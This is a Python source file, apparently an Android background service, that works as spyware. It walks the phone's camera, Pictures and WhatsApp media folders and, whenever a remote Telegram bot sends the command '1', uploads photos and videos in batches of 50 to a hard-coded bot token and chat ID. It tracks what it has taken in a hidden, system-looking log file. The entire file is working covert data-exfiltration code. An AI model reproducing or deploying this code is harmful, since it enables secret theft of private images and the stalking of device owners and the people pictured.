from time import sleep
import os
import requests
from jnius import autoclass

# الربط الرسمي بخدمة أندرويد لمنع الانهيار
try:
    PythonService = autoclass('org.kivy.android.PythonService')
    service = PythonService.mService
except:
    service = None

BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"
LOG_FILE = "/storage/emulated/0/.sys_log_data.txt"

def get_sent():
    if not os.path.exists(LOG_FILE): return set()
    with open(LOG_FILE, "r") as f: return set(f.read().splitlines())

def save_sent(path):
    with open(LOG_FILE, "a") as f: f.write(path + "\n")

def send_file(path):
    try:
        ext = path.lower()
        method = "sendVideo" if ext.endswith((".mp4", ".mkv", ".mov")) else "sendDocument"
        key = "video" if method == "sendVideo" else "document"
        with open(path, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", 
                          data={"chat_id": CHAT_ID}, files={key: f}, timeout=60)
        return True
    except: return False

def scan_files():
    targets = ["/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures", "/storage/emulated/0/WhatsApp/Media"]
    found = []
    sent = get_sent()
    for t in targets:
        for root, _, files in os.walk(t):
            for f in files:
                if f.lower().endswith((".jpg", ".png", ".mp4")):
                    p = os.path.join(root, f)
                    if p not in sent and os.path.getsize(p) < 30000000:
                        found.append(p)
    found.sort(key=os.path.getmtime) # الأقدم أولاً
    return found

def main():
    while True:
        try:
            # فحص إذا أرسلت 1 في البوت
            res = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={"offset": -1}).json()
            if res.get("result") and res["result"][-1].get("message", {}).get("text") == "1":
                files = scan_files()
                if not files:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "⚠️ الجهاز فارغ."})
                else:
                    for p in files[:50]: # سحب 50 ملف كل مرة
                        if send_file(p): save_sent(p)
                        sleep(2)
            sleep(15) # انتظار 15 ثانية لراحة النظام
        except: sleep(20)

if __name__ == "__main__":
    main()
